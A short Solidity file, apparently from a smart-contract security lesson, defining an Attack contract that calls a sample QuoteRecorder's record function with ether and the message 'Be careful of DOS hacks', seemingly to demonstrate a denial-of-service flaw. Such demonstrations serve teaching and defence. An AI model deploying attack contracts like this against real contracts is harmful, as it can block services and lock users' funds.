// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./1-QuoteRecorder.sol";

contract Attack {
    function attack(QuoteRecorder _quoteRecorder) public payable {
        _quoteRecorder.record{value: msg.value}("Be careful of DOS hacks");
    }
}
